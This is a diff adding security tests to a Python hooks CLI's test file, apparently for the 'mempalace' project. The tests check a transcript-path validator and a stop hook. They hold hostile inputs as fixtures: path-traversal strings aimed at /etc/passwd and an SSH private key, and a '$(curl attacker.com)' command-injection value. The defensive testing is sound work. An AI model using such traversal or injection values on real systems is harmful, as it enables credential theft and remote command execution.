@@ -15,6 +15,7 @@ from mempalace.hooks_cli import (
     _maybe_auto_ingest,
     _parse_harness_input,
     _sanitize_session_id,
+    _validate_transcript_path,
     hook_stop,
     hook_session_start,
     hook_precompact,
@@ -418,3 +419,66 @@ def test_run_hook_invalid_json(tmp_path):
             with patch("mempalace.hooks_cli._output") as mock_output:
                 run_hook("session-start", "claude-code")
     mock_output.assert_called_once_with({})
+
+
+# --- Security: transcript_path validation ---
+
+
+def test_validate_transcript_rejects_path_traversal():
+    """Paths with '..' components should be rejected."""
+    assert _validate_transcript_path("../../etc/passwd") is None
+    assert _validate_transcript_path("../../../.ssh/id_rsa") is None
+
+
+def test_validate_transcript_rejects_wrong_extension():
+    """Only .jsonl and .json extensions are accepted."""
+    assert _validate_transcript_path("/tmp/transcript.txt") is None
+    assert _validate_transcript_path("/tmp/secret.py") is None
+    assert _validate_transcript_path("/home/user/.ssh/id_rsa") is None
+
+
+def test_validate_transcript_accepts_valid_paths(tmp_path):
+    """Valid .jsonl and .json paths should be accepted."""
+    jsonl_path = tmp_path / "session.jsonl"
+    jsonl_path.touch()
+    result = _validate_transcript_path(str(jsonl_path))
+    assert result is not None
+    assert result.suffix == ".jsonl"
+
+    json_path = tmp_path / "session.json"
+    json_path.touch()
+    result = _validate_transcript_path(str(json_path))
+    assert result is not None
+    assert result.suffix == ".json"
+
+
+def test_validate_transcript_empty_string():
+    """Empty transcript path should return None."""
+    assert _validate_transcript_path("") is None
+
+
+def test_count_rejects_traversal_path():
+    """_count_human_messages should return 0 for path traversal attempts."""
+    assert _count_human_messages("../../etc/passwd") == 0
+
+
+def test_stop_hook_rejects_injected_stop_hook_active(tmp_path):
+    """stop_hook_active with shell injection string should not cause issues."""
+    transcript = tmp_path / "t.jsonl"
+    _write_transcript(
+        transcript,
+        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
+    )
+    # Simulate a malicious stop_hook_active value
+    result = _capture_hook_output(
+        hook_stop,
+        {
+            "session_id": "test",
+            "stop_hook_active": "$(curl attacker.com)",
+            "transcript_path": str(transcript),
+        },
+        state_dir=tmp_path,
+    )
+    # The injected value is not "true"/"1"/"yes", so the hook should NOT pass through
+    # It should count messages and block at the interval
+    assert result["decision"] == "block"
